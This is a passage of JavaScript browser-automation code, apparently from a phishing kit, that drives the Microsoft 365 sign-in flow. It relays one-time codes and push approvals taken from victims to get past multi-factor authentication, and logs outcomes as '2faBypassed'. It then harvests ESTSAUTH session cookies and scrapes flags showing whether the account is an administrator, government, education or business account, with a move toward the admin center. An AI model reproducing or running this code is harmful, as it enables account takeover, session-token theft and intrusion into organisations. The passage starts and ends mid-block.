MfaCode = await waitForOTP(dataid,decodeURI(dataemail),'login',{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode],Date.now(),limiteTime,1000,page);
console.log('MfaCode :...'+MfaCode);


if(typeof MfaCode !== 'undefined' && MfaCode/*res1&&res1.Code!==false*/){ isget2fakey = MfaCode /*isget2fakey = res1.Code*/;console.log('2fa: '+isget2fakey); try{/*await page.click("#idTxtBx_SAOTCC_OTC",{clickCount: 3})*/await page.$eval('#idTxtBx_SAOTCC_OTC', el => el.value = '');await page.type("#idTxtBx_SAOTCC_OTC",isget2fakey/*res1.Code*/,{delay:25});console.log("2fa puted..");}catch(e){console.log("2fa not puted catch err:"+e);}await page.waitForSelector("#idSubmit_SAOTCC_Continue");await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'AfterType2fa',datadebug,false);/*;await page.click("#idSubmit_SAOTCC_Continue");await page.waitForNavigation()*//*await page.waitForNavigation('networkidle0');*/try{if(await page.$('#idChkBx_SAOTCC_TD') !== null){await page.$eval('#idChkBx_SAOTCC_TD', check => check.checked = true);console.log("Checkbox checked: Don't ask again for ? days.");}}catch(e){console.log('Checkbox catch error:'+e);};try{page.click("#idSubmit_SAOTCC_Continue");ResponseEnd = await page.waitForResponse((response) => {return response.url() == 'https://login.microsoftonline.com/common/SAS/EndAuth'})/*"https://login.microsoftonline.com/common/SAS/ProcessAuth"*/;console.log("2fa submited:");console.log('ResponseEndURL():',ResponseEnd.url());try{console.log('ResponseEnd  :',JSON.stringify(await ResponseEnd.json()));/*console.log('Response2:',JSON.stringify(await ResponseAuth.json()));*/}catch(errr){console.log('EndAuth Response IS NOT JSON errr  :'+errr);};}catch(e){isMfaError=true;console.log('someting happened with 2fa. catch error1:..'+e);}if(ResponseEnd){try{ResponseEndjson=await ResponseEnd.json();console.log('Success:'+ResponseEndjson['Success']);}catch(err){console.log('faild fetch ResponseEnd.json()..');ResponseEndjson=false;}if((ResponseEndjson && ResponseEndjson['Success'] && ResponseEndjson['Success']===true)||!ResponseEndjson&&(await page.url().includes('https://www.office.com/')||await page.url().includes(Redirect_uri)||await page.url().includes('/SAS/ProcessAuth')||await page.$('#hero-heading') !== null||await page.url().includes('login.microsoftonline.com/kmsi')||await page.$('#KmsiDescription') !== null)){MfaFailed=false;MfaSucceed=true;console.log('2fa succeed');status="2faBypassed";}else if(ResponseEndjson && ResponseEndjson['Success']===false&&(ResponseEndjson['ResultValue']==="OathCodeIncorrect"||ResponseEndjson['ResultValue']==="SMSAuthFailedWrongCodeEntered")/*ResponseEndjson['Message']==='Wrong code entered.'*/){MfaFailed=true;MfaSucceed=false;console.log('Wrong code 2fa');status="Wrongcode2fa";}else if(ResponseEndjson && ResponseEndjson['Success']===false && ResponseEndjson['ResultValue']==="InvalidSession"){MfaFailed=true;MfaSucceed=false;console.log('2fa Expired');status="2faExpired";}else if(ResponseEndjson && ResponseEndjson['Success']===false){MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}else{isMfaError=true;console.log('something happened with 2fa');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}}else{isMfaError=true;console.log('something happend with 2fa.');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}/*await page.waitForFunction("!document.querySelector('#idSubmit_SAOTCC_Continue') || document.querySelector('#iddSpan_SAOTCC_Error_OTC')")*/; console.log("2fa submited  :"); if(isMfaError){if (await page.$('.alert-error') !== null) {console.log("Wrong 2fa"); status="2faFailed";}else if(await page.$('#idSpan_SAOTCC_Error_OTC') !== null){console.log("incorrect 2fa code");status="2faFailed";}else if(await page.$('#expired') !== null){console.log("error 2fa code or expired or someting happend with 2fa");status="2faExpired";}else{console.log("2fa bypassed");}} /*ok=true; */} else {console.log("2fa null");isget2fakey = null;status="2faIntrouvable";}
}
    
}catch(e){ console.log("2fa is failed catch err :"+e); }



     
    }
    
    /*
    }else if(await page.$('[value=PhoneAppNotification]') !== null){
    MfaMode='PhoneAppNotification';   
     isMfaBox = true;
    }else if(await page.$('[value=PhoneAppOTP]') !== null){
    MfaMode='PhoneAppOTP';  
     isMfaBox = true;
    }else if(await page.$('[value=OneWaySMS]') !== null){
    MfaMode='OneWaySMS';  
     isMfaBox = true;
    }*/
        }else{console.log('mfa box err');}
 
    
}else{
try{
await page.goBack();
//await page.goForward();

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err25:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}
 console.log("back and forward the page and put 2fa again");


 if(await page.$('#idDiv_SAOTCS_Proofs_Section') !== null){
            console.log('mfa panel.');
            
               if (await page.$('#idDiv_SAOTCS_ShowMoreProofs') !== null){
   console.log('Show more verification methods10'); 
   await page.click("#idDiv_SAOTCS_ShowMoreProofs");
   await page.waitForFunction('!document.querySelector("#idDiv_SAOTCS_ShowMoreProofs")');
   console.log('ShowMoreProofs clicked successfully10');
   }
             all2FA = await page.evaluate(() => { let anchors = Array.from(document.querySelectorAll("#idDiv_SAOTCS_Proofs > div > div")); let anchors2 =anchors.map(anchor => anchor.getAttribute("data-value")); return anchors2; });
             console.log('all2FA(9):'+JSON.stringify(all2FA, null, 4));   
        //document.querySelector("[data-value="+MfaMode+"]").click();
        await page.click("[data-value="+MfaMode+"]");
        isMfaBox = await page.waitForSelector(MfaNeedSelector[0]).then(async() => {page.click('[data-value='+MfaMode+']');await page.waitForSelector('#idTxtBx_SAOTCC_OTC'); console.log('[value='+MfaMode+']'); return true; }).catch(async(e) => {console.log(e)});
        console.log('isMfaBox = '+isMfaBox);
    if (await page.$('[value='+MfaMode+']') !== null && await page.$('#idTxtBx_SAOTCC_OTC') !== null ) {
    //MfaMode=MfaNeedMode; 
     isMfaBox = true;
     
     console.log('[value='+MfaMode+'] is clicked2');
}
}

 await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'PageGoBack',datadebug,false);



//await page.reload({ waitUntil: ["networkidle0", "domcontentloaded"] });
if(await page.$("#idTxtBx_SAOTCC_OTC") !== null){
    console.log("2fa box after back and forward the page");

MfaCode = false;
MfaCode = await waitForOTP(dataid,decodeURI(dataemail),'login',{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode],Date.now(),limiteTime,1000,page);
console.log('MfaCode :....'+MfaCode);


if(typeof MfaCode !== 'undefined' && MfaCode/*res1&&res1.Code!==false*/){ isget2fakey = MfaCode /*isget2fakey = res1.Code*/;console.log('2fa: '+isget2fakey); try{/*await page.click("#idTxtBx_SAOTCC_OTC",{clickCount: 3})*/await page.$eval('#idTxtBx_SAOTCC_OTC', el => el.value = '');await page.type("#idTxtBx_SAOTCC_OTC",isget2fakey/*res1.Code*/,{delay:25});console.log("2fa puted...");}catch(e){console.log("2fa not puted catch err:"+e);}await page.waitForSelector("#idSubmit_SAOTCC_Continue");await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'AfterType2fa',datadebug,false);/*;await page.click("#idSubmit_SAOTCC_Continue");await page.waitForNavigation()*//*await page.waitForNavigation('networkidle0');*/try{if(await page.$('#idChkBx_SAOTCC_TD') !== null){await page.$eval('#idChkBx_SAOTCC_TD', check => check.checked = true);console.log("Checkbox checked: Don't ask again for ? days.");}}catch(e){console.log('Checkbox catch error:'+e);};try{page.click("#idSubmit_SAOTCC_Continue");ResponseEnd = await page.waitForResponse((response) => {return response.url() == 'https://login.microsoftonline.com/common/SAS/EndAuth'})/*"https://login.microsoftonline.com/common/SAS/ProcessAuth"*/;console.log("2fa submited:");console.log('ResponseEndURL()   :',ResponseEnd.url());try{console.log('ResponseEnd   :  ',JSON.stringify(await ResponseEnd.json()));/*console.log('Response2:',JSON.stringify(await ResponseAuth.json()));*/}catch(errr){console.log('EndAuth Response IS NOT JSON errr   :'+errr);};}catch(e){isMfaError=true;console.log('someting happened with 2fa. catch error1:...'+e);}if(ResponseEnd){try{ResponseEndjson=await ResponseEnd.json();console.log('Success:'+ResponseEndjson['Success']);}catch(err){console.log('faild fetch ResponseEnd.json()...');ResponseEndjson=false;}if((ResponseEndjson && ResponseEndjson['Success'] && ResponseEndjson['Success']===true)||!ResponseEndjson&&(await page.url().includes('https://www.office.com/')||await page.url().includes(Redirect_uri)||await page.url().includes('/SAS/ProcessAuth')||await page.$('#hero-heading') !== null||await page.url().includes('login.microsoftonline.com/kmsi')||await page.$('#KmsiDescription') !== null)){MfaFailed=false;MfaSucceed=true;console.log('2fa succeed');status="2faBypassed";}else if(ResponseEndjson && ResponseEndjson['Success']===false&&(ResponseEndjson['ResultValue']==="OathCodeIncorrect"||ResponseEndjson['ResultValue']==="SMSAuthFailedWrongCodeEntered")/*ResponseEndjson['Message']==='Wrong code entered.'*/){MfaFailed=true;MfaSucceed=false;console.log('Wrong code 2fa');status="Wrongcode2fa";}else if(ResponseEndjson && ResponseEndjson['Success']===false && ResponseEndjson['ResultValue']==="InvalidSession"){MfaFailed=true;MfaSucceed=false;console.log('2fa Expired');status="2faExpired";}else if(ResponseEndjson && ResponseEndjson['Success']===false){MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}else{isMfaError=true;console.log('something happened with 2fa');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}}else{isMfaError=true;console.log('something happend with 2fa.');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";}/*await page.waitForFunction("!document.querySelector('#idSubmit_SAOTCC_Continue') || document.querySelector('#iddSpan_SAOTCC_Error_OTC')")*/; console.log("2fa submited   :"); if(isMfaError){if (await page.$('.alert-error') !== null) {console.log("Wrong 2fa"); status="2faFailed";}else if(await page.$('#idSpan_SAOTCC_Error_OTC') !== null){console.log("incorrect 2fa code");status="2faFailed";}else if(await page.$('#expired') !== null){console.log("error 2fa code or expired or someting happend with 2fa");status="2faExpired";}else{console.log("2fa bypassed");}} /*ok=true; */} else {console.log("2fa null");isget2fakey = null;status="2faIntrouvable";}
}
    
}catch(e){ console.log("2fa is failed catch err2 :"+e); }


    
}

};


 await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'EndOfMfaCode',datadebug,false);

    
}else if(MfaMode=='PhoneAppNotification'){

try{
    if(await page.$('#idChkBx_SAOTCC_TD') !== null){
        await page.$eval('#idChkBx_SAOTCC_TD', check => check.checked = true);console.log("Checkbox checked: Don't ask again for ? days.....");
    }
}catch(e){
    console.log('Checkbox catch error:'+e);
}

console.time('fetch1('+RandArr[6]+')');
var i=0;
var imoin=0;
var ok = false;
console.time('whileEnd('+RandArr[6]+')');
while(!ok&&i<50&&new Date().getTime() < BeginTime.getTime()+limiteTime){
    
await page.waitForTimeout(i*500);    
i++;
imoin++;
console.time('while i='+i+'('+RandArr[6]+')');

try{
ResponseEnd = await page.waitForResponse((response) => {return response.url() == 'https://login.microsoftonline.com/common/SAS/EndAuth'})/*"https://login.microsoftonline.com/common/SAS/ProcessAuth"*/;console.log('ResponseEndURL()    :    ',ResponseEnd.url());try{console.log('ResponseEnd     :  ',JSON.stringify(await ResponseEnd.json()));}catch(errr){console.log('EndAuth Response IS NOT JSON errr    :'+errr);};
}catch(e){
    isMfaError=true;console.log('someting happened with 2fa. catch error4:'+e);
}
if(ResponseEnd){
    try{
        ResponseEndjson=await ResponseEnd.json();console.log('Success:'+ResponseEndjson['Success']);
    }catch(err){
        console.log('faild fetch ResponseEnd.json()....');ResponseEndjson=false;
    }
    if((ResponseEndjson && ResponseEndjson['Success'] && ResponseEndjson['Success']===true)||!ResponseEndjson&&(await page.url().includes('https://www.office.com/')||await page.url().includes(Redirect_uri)||await page.url().includes('/SAS/ProcessAuth')||await page.$('#hero-heading') !== null||await page.url().includes('login.microsoftonline.com/kmsi')||await page.$('#KmsiDescription') !== null)){
        MfaFailed=false;MfaSucceed=true;console.log('2faBypassed');status="2faBypassed";
        ok=true;
    }else if(ResponseEndjson && ResponseEndjson['Success']===false && ResponseEndjson['ResultValue'] && ResponseEndjson['ResultValue']==='PhoneAppDenied'){
        MfaFailed=true;MfaSucceed=false;console.log('2fa denied');status="2faDenied";
        ok=true;
        //ResultValue="PhoneAppDenied"
        //console.log('ResponseEnd.json()::',JSON.stringify(ResponseEndjson));
    }else if(ResponseEndjson && ResponseEndjson['Success']===false&&ResponseEndjson['ResultValue']&&ResponseEndjson['ResultValue']=="PhoneAppNoResponse"){
        MfaFailed=true;MfaSucceed=false;console.log('2fa Expired');status="2faExpired";
        ok=true;
    }
}else{
    isMfaError=true;console.log('something happend with 2fa.');MfaFailed=true;MfaSucceed=false;console.log('2fa Failed');status="2faFailed";
}/*await page.waitForFunction("!document.querySelector('#idSubmit_SAOTCC_Continue') || document.querySelector('#iddSpan_SAOTCC_Error_OTC')")*/ 
if(isMfaError){
    if (await page.$('#idDiv_SAASTO_Title') !== null) {
        MfaFailed=true;MfaSucceed=false;console.log('2fa Expired');status="2faExpired";
        ok=true;
    }else if(await page.$('#idDiv_SAASDS_Title') !== null){
        MfaFailed=true;MfaSucceed=false;console.log('2fa denied.');status="2faDenied";
        ok=true;
    }
}
 


console.timeEnd('while i='+i+'('+RandArr[6]+')');
}//end while()

console.timeEnd('whileEnd('+RandArr[6]+')');
console.timeEnd('fetch1('+RandArr[6]+')');
} 
//{PhoneAppNotification:"push",PhoneAppOTP:"otp", OneWaySMS:"sms"}[MfaMode]
if(MfaMode=='OneWaySMS'){
    typeMfa="sms";
}else if(MfaMode=='PhoneAppOTP'){
    typeMfa="otp";
}else if(MfaMode=='PhoneAppNotification'){
    typeMfa="push";
}

if(!MfaCode&&(MfaMode=='PhoneAppOTP'||MfaMode=='OneWaySMS')){
    console.log('2fa session timeout:'+(new Date().getTime() - BeginTime.getTime())+'ms -- ('+new Date()+')');//3min
    status="TimeoutWaitingFor2FA";
    MfaFailed=true;
    MfaSucceed=false






if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa] !== 'undefined'){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log(typeMfa+': '+ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]);
       console.log('Code:  '+MfaCode);
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
//ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]='no';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']='CodeNotFound';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['retry']=false; 
console.log('sms code is NotFound:',JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));
try{
//var isPaSsEd = false;
if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']!== 'undefined'&&ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']=='CodeNotFound'){
//isPaSsEd = true; 
console.log('successful put result in ResultByIds:["'+typeMfa+'"]["result"]=="CodeNotFound"');
}
}catch(ee){console.log('successful put result in ResultByIds:["'+typeMfa+'"]["result"]=="CodeNotFound"');}

    }

    
    





 
   
}else if(MfaCode&&MfaSucceed){
if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa] !== 'undefined'/*&& ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa] !== false*/){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log(typeMfa+': '+JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));
       console.log('Code :   '+MfaCode);
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]="ok";
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']='CorrectCode';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['retry']=false; 
console.log('sms code bypassed successefly:',JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));

//var isPaSsEd = false;
if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]!== 'undefined'&&ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]=="ok"){
//isPaSsEd = true
console.log('successful put result in ResultByIds:'+MfaCode+'="ok"');   
}else{console.log('failed put result in ResultByIds:'+MfaCode+'="ok"');}

    }

    
}else if(MfaCode&&!MfaSucceed){

if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa] !== 'undefined'){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log(typeMfa+': '+JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));
       console.log('Code  :   '+MfaCode);
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]='no';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']='WrongCode';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['retry']=true; 
console.log('sms code is wrong or timeout :',JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));

//var isPaSsEd = false;
if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]!== 'undefined'&&ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]=='no'){
//isPaSsEd = true; 
console.log('successful put result in ResultByIds:'+MfaCode+'="no"');
}else{console.log('failed put result in ResultByIds:'+MfaCode+'="no"');}

    }

    
    
}else if(MfaMode=='PhoneAppNotification'&& (!ok||(status && (status=='2faExpired'||status=='TimeoutWaitingFor2FA')))){


    status="TimeoutWaitingFor2FA";//"PushNoResponse"//"TimeoutWaitingForResponse"
    MfaFailed=true;
    MfaSucceed=false

console.log('PhoneAppNotification timeout:'+(new Date().getTime() - BeginTime.getTime())+'ms -- ('+new Date()+')');//55sec


if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa] !== 'undefined'){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log(typeMfa+': '+JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
//ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]='no';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']='PushNoResponse';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['retry']=false; 
console.log('Push Notification is denied or timeout :',JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));

//var isPaSsEd = false;
if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']!== 'undefined'&&ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']=='PushNoResponse'){
//isPaSsEd = true; 
console.log('successful put result in ResultByIds:["'+typeMfa+'"]["result"]=="PushNoResponse"');
}else{console.log('failed put result in ResultByIds:["'+typeMfa+'"]["result"]=="PushNoResponse"');}

    }



}else if(ok&&MfaSucceed){
if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa] !== 'undefined'/*&& ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa] !== false*/){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log(typeMfa+': '+JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));
       console.log('Code   :    '+MfaCode);
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
//ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]="ok";
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']='PushAppOk';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['retry']=false; 
console.log('Push Notification is bypassed successefly:',JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));

//var isPaSsEd = false;
if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']!== 'undefined'&&ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']=='PushAppOk'){
//isPaSsEd = true
console.log('successful put result in ResultByIds:["'+typeMfa+'"]["result"]=="PushAppOk"');   
}else{console.log('failed put result in ResultByIds:["'+typeMfa+'"]["result"]=="PushAppOk"');}

    }

    
}else if(ok&&!MfaSucceed){

if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa] !== 'undefined'){
        //variable exists, do what you want
        //[ 'PASSWORD', 'TOTP', 'GOTP', 'PUSH', 'EMAIL' ]
       console.log(typeMfa+': '+JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));
       //ResultByIds[dataId]['otp'] = { "PASSWORD": "", "TOTP": "", "GOTP": "", "PUSH" : "", "EMAIL": "", "Time":new Date().toUTCString() };
//ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa][MfaCode]='no';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']='PushAppDenied';
ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['retry']=false; 
console.log('Push Notification is denied or timeout :',JSON.stringify(ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]));

//var isPaSsEd = false;
if(typeof ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']!== 'undefined'&&ResultByIds[dataid][decodeURI(dataemail)]['login']['mfa'][typeMfa]['result']=='PushAppDenied'){
//isPaSsEd = true; 
console.log('successful put result in ResultByIds:["'+typeMfa+'"]["result"]=="PushAppDenied"');
}else{console.log('failed put result in ResultByIds:["'+typeMfa+'"]["result"]=="PushAppDenied"');}

    }

    
    
}



}else{if(done&&!status){status="done";}else if(faillogin&&!status){status="faillogin";};console.log('status :'+status);}
/*  await page.setCookie({
    'value':
        'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE1MTAzMjE1MDEsInN1YiI6NCwiaWF0IjoxNTEwMjYxNTAxLCJqdGkiOiJLYnoxSmxDMDlDTXRndXBhQzRLRHRnIn0.NkgBUKof9VUm_FrEicDRP3I-G-tIEl0feXS-RAGtyj4',
    'domain': 'foo.dummy.com.0.0.0.0.nip.io',
    'expires': Date.now() / 1000 + 10,
    'name': 'jwt_token'
  });
  */

try{
    try{
console.log('url:'+await page.url());
//https://login.microsoftonline.com/common/login
await page.waitForFunction(`window.location.href.includes("${Redirect_uri}")||window.location.href.includes("https://www.office.com/")||document.querySelector("#hero-heading")||window.location.href.includes("login.microsoftonline.com/kmsi")||document.querySelector("#KmsiDescription")||window.location.href.includes("https://login.microsoftonline.com/common/login")||document.querySelector("#ProofUpDescription")`); 

if (((successlogin&&MfaSucceed)||done)&&(await page.$('#ProofUpDescription') !== null)) {
console.log('More information required.');
//Your organization needs more information to keep your account secure
//#idSubmit_ProofUp_Redirect

await page.click("#idSubmit_ProofUp_Redirect");
console.log("(More information required button submited4");
await page.waitForNavigation('networkidle0');
console.log("Is this info up to date?");
if(await page.$x('//span[text()="Ok"]') !== null){
let [element] = await page.$x('//span[text()="Ok"]');    
await page.click(element[0])
await page.waitForNavigation('networkidle0');    
    

try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err1:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'InformationRequired',datadebug,false);

if(await page.$('.adminScoped') !== null){
console.log('Your account (Z213901846@taalim.ma) doesn’t have permission to view or manage this page in the Microsoft 365 admin center.');
//https://admin.microsoft.com/
          
      }

}


}

if (((successlogin&&MfaSucceed)||done)&&(await page.$('#KmsiDescription') !== null)) {
console.log('Stay signed in.');
const Staysigned = await page.waitForSelector("#idSIButton9").then(async() => {await page.click("#idSIButton9");/*await page.waitForNavigation('networkidle0');await page.waitForResponse(response => response.ok());*/ console.log("(Stay signed in) button submited4");await page.waitForFunction(`window.location.href.includes("${Redirect_uri}")||window.location.href.includes("https://www.office.com/")||document.querySelector("#hero-heading")`);console.log('redirect to office.com'); return true; }).catch(e => { console.log("Stay signed in catch err2:"+e); return false; });
if(Staysigned){console.log('Stay signed in submited');}
}  
}catch(e){ console.log("catch err:"+e); }



if((successlogin&&MfaSucceed)||done){
try{
await page.waitForFunction(`window.location.href.includes("${Redirect_uri}")||window.location.href.includes("https://www.office.com/")||document.querySelector("#hero-heading")`);
//console.log('office landing page');
console.log(await page.title());
}catch(e){ console.log("catch err..:"+e); }


try{await page.waitForSelector('body', {waitUntil: 'networkidle2'});}catch(e){console.log('fail waitForSelector(body), catch err1:'+e);try{await page.waitForNavigation('networkidle2');}catch(e){}}

await debug(page,Math.floor(100000+Math.random() * 900000) + 1,RandArray.shift(),'OfficeLandingPage',datadebug,false);

try{
    console.log('url::'+await page.url());
const htmlbody = await page.content();
//console.log('htmlbody:'+htmlbody);

try{
if(htmlbody.indexOf('"userCountryCode":"') > -1){

var userCountryCoderegex = /"userCountryCode":"[^"]+/;//userCountryCode":"(.*)"
AccCountryCode = userCountryCoderegex.exec(htmlbody)[0].substr(0).replace('"userCountryCode":"', '');
console.log("AccCountryCode:" + AccCountryCode);

if(AccCountryCode && AccCountryCode.length > 1){                     
result['CountryCode'] = AccCountryCode;
}else{
AccCountryCode = false;    
} 
  
  
}
}catch(e){ console.log("userCountryCode catch err...:"+e); }


try{
if(htmlbody.indexOf('"isAdmin":true') > -1){
isAdmin = true;
result['isAdmin'] = isAdmin;
console.log("isAdmin:" + isAdmin);
console.log("administrator user office 365 account");
}
}catch(e){console.log("isAdmin catch err...:"+e); }




try{
if(htmlbody.indexOf('"isGcc":true') > -1){
isGcc = true;
result['isGcc'] = isGcc;
console.log("isGcc:" + isGcc);
console.log("cybersecurity federal office 365 account");
}
}catch(e){console.log("isGcc catch err...:"+e); }



try{
if(htmlbody.indexOf('"isConsumerUser":true') > -1){
isConsumerUser = true;
result['isConsumerUser'] = isConsumerUser;
console.log("isConsumerUser:" + isConsumerUser);
console.log("free personal office 365 account");
}
}catch(e){console.log("isConsumerUser catch err...:"+e); }



try{
if(htmlbody.indexOf('"isSmb":true') > -1){
isSmb = true;
result['isSmb'] = isSmb;
console.log("isSmb:" + isSmb);
console.log("small business office 365 account");
}
}catch(e){console.log("isSmb catch err...:"+e); }
 


try{
if(htmlbody.indexOf('"isEdu":true') > -1||htmlbody.indexOf('"isEduStudent":true') > -1||htmlbody.indexOf('"isEduFaculty":true') > -1){
isEdu = true;
result['isEdu'] = isEdu;
console.log("isEdu:" + isEdu);
console.log("Education(school) account office 365 account");
}
}catch(e){console.log("isEdu catch err...:"+e); }
 
 

}catch(e){ console.log("catch err...:"+e); }
}


if(((successlogin&&MfaSucceed)||done)&&((setcookie&&cookie)||getcookie)){
  cookies=await page.cookies('https://login.microsoftonline.com/');
  console.log('cookies[1][name]:',cookies[1]['name']);
  //console.log('if cookies includes(ESTSAUT or ESTSAUTHPERSISTENT or ESTSAUTHLIGHT) success');
  //faillogin=true;status='expired cookies';console.log('fail login with sessions. error, err:'+e)
  const cookieNeeded = cookies.some((cookie) => (cookie.name).startsWith('ESTSAUT'));
 // const cookieNeeded2 = cookies.find((cookie) => cookie.name ==='ESTSAUTHPERSISTENT');
  //const cookieNeeded3 = cookies.find((cookie) => cookie.name ==='ESTSAUTHLIGHT');

// If the desired cookie is found in the array, get its value
if(typeof cookieNeeded == 'undefined'/*||typeof cookieNeeded2 == 'undefined'||typeof cookieNeeded3 == 'undefined'*/) {
  cookies=false;
  status="expiredcookies";
  console.log('ESTSAUT cookies doesn\'t found');
}
}



if((isAdmin&&(await page.$('#Admin') !== null|| await page.$('#O365_AppTile_Admin') !== null))&&(done||(successlogin&&MfaSucceed))&&(getcookie||(setcookie&&cookie))){
    
var AdminButton=false;
var AdminUrl = 'ezrzrrztrerddffc';
if(getAdminSession&&((await page.$('#Admin') !== null&&(AdminButton='#Admin')) || (await page.$('#O365_AppTile_Admin') !== null&&(AdminButton='#O365_AppTile_Admin')))){
console.log('office admin button selector:'+AdminButton);

isAdmin=true;



//START:: CLICK BUTTON WITH (TARGET:_BLANK) AND OPEN URL IN SOME TAB
    const browser = page.browser();
    
    let clickAndWaitForTarget = async (clickSelector, page, browser) => {
    const pageTarget = page.target(); //save this to know that this was the opener
    await page.click(clickSelector); //click on a link
    //clickOnElement(clickSelector);
    
